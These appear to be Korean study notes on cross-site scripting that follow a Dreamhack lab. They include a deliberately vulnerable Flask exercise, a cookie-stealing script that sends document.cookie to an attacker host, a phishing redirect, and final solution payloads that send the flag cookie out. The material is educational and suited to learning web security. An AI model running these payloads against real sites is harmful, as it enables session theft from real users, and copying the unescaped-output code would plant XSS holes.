# Cross Site Scripting(XSS)

## Cross Site Scripting(XSS)

- XSS는 클라이언트 취약점 중 하나로, 공격자가 웹 리소스에 악성 스크립트를 삽입해, 이용자의 웹 브라우저에서 해당 스크립트를 실행할 수 있다.
- 공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있다.
- Ex) 드림핵 웹 페이지에서 XSS 취약점이 존재하면 [https://dreamhack.io](https://dreamhack.io) 내에서 오리진 권한으로 악성 스크립트를 삽입한다. 이후에 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자가 임의로 삽입한 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있다.
- 해당 취약점은 SOP 보안 정책이 등장하면서 서로 다른 오리진에서는 정보를 읽는 행위가 이전에 비해 힘들어졌다. 그러나 이를 우회하는 기술이 소개 되며 XSS 공격은 지속되고 있다.

## XSS 발생 예시와 종류

- XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.
- Ex) “안녕하세요, 00 회원님”과 같은 문구 또는 게시물과 댓글
- 클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청하고 서버로 받은 응답, 즉 HTML, CSS, JS 등의 웹 리소스를 시각화하여 이용자에게 보여준다.
- 이 때 HTML, CSS, JS와 등 과 같은 코드가 포함된 게시물을 조회할 경우 이용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있다.

### XSS 종류

1. Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
2. Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
3. DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS * Fragment는 서버 요청 / 응답에 포함되지 않음
4. Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

## XSS 스크립트의 예시

- **자바스크립트는** 웹 문서의 동작을 정의한다. 이는 이용자가 버튼 클릭 시에 어떤 이벤트를 발생시킬지와 데이터 입력 시 해당 데이터를 전송하는 이벤트를 구현할 수 있다.
- 이러한 기능 외에도 이용자와의 상호작용 없이 이용자의 권한으로 정보를 조회하거나 변경하는 등의 행위가 가능하다.
- 이게 가능한 이유는 이용자를 식별하기 위한 세션 및 쿠키가 웹 브라우저에 저장되어 있기 때문이다.
- 따라서 공격자는 자바스크립트를 통해 이용자에게 보여지는 웹 페이지를 조작하거나, 웹 브라우저의 위치를 임의의 주소로 변경할 수 있다.
- 자바스크립트는 다양한 동작을 정의할 수 있기에 XSS 공격에 주로 사용된다.
---
### figure 1

```python
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

### figure 2

```python
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

### figure 3

```python
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```
---
## Stored XSS

- **Stored XSS**는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS이다. 대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드 하는 방식이 있다. 
- 게시물은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가진다.

## Reflected XSS

- **Reflected XSS**는 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생한다. 대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있다. 
- 이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환한다. 일부 서비스에서는 검색 결과를 응답에 포합하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있다.
- Reflected XSS는 Stored XSS와는 다르게 URL과 같은 이용자의 요청에 의해 발생한다. 따라서 공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 한다. 
- 이용자에게 링크를 직접 전달하는 방법은 악성 스크립트 포함 여부를 이용자가 눈치챌 수 있기 때문에 주로 **Click Jacking** 또는 **Open Redirect** 등 다른 취약점과 연계하여 사용한다.
## - 요약
- **Cross Site Scripting(XSS)** : 클라이언트 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 취약점
- **Stored XSS**: 악성 스크립트가 서버 내에 존재, 이용자가 저장된 악성 스크립트를 조회할 때 발생
- **Reflected XSS** : 악성 스크립트가 이용자 요청 내에 존재, 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 존재.

## Exercise : XSS

### /vuln
```python
@app.route("/vuln")def vuln(): param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴 return param # 이용자의 입력값을 화면 상에 표시
```
### /memo
```python
||@app.route("/memo") # memo 페이지 라우팅|
||def memo(): # memo 함수 선언|
||global memo_text # 메모를 전역변수로 참조|
||text = request.args.get("memo", "") # 이용자가 전송한 memo 입력값을 가져옴|
||memo_text += text + "\n" # 이용자가 전송한 memo 입력값을 memo_text에 추가|
||return render_template("memo.html", memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력|
```
### /flag
```python
def read_url(url, cookie={"name": "name", "value": "value"}):
	cookie.update({"domain": "127.0.0.1"})
	 try:
		service = Service(executable_path="/chromedriver") 
		options = webdriver.ChromeOptions() 
		for _ in [
			"headless", 
			"window-size=1920x1080",
			"disable-gpu", 
			"no-sandbox", 
			"disable-dev-shm-usage", ]:
				options.add_argument(_)
		driver = webdriver.Chrome(service=service, options=options) 
		driver.implicitly_wait(3) 
		driver.set_page_load_timeout(3) 
		driver.get("http://127.0.0.1:8000/") 
		driver.add_cookie(cookie) 
		driver.get(url)
		except Exception as e: 
			driver.quit() 
			# return str(e) 
			return False
		driver.quit() 
		return True
def check_xss(param, cookie={"name": "name", "value": "value"}): 
	url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" 
	return read_url(url, cookie)
@app.route("/flag", methods=["GET", "POST"])
def flag():
	if request.method == "GET": 
		return render_template("flag.html") 
	elif request.method == "POST": 
		param = request.form.get("param")
		 if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
			  return '<script>alert("wrong??");history.go(-1);</script>' 
		return '<script>alert("good");history.go(-1);</script>'
```

<script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>

<script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>

<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">

script list, sql injection 어떻게 동작하는지 파악.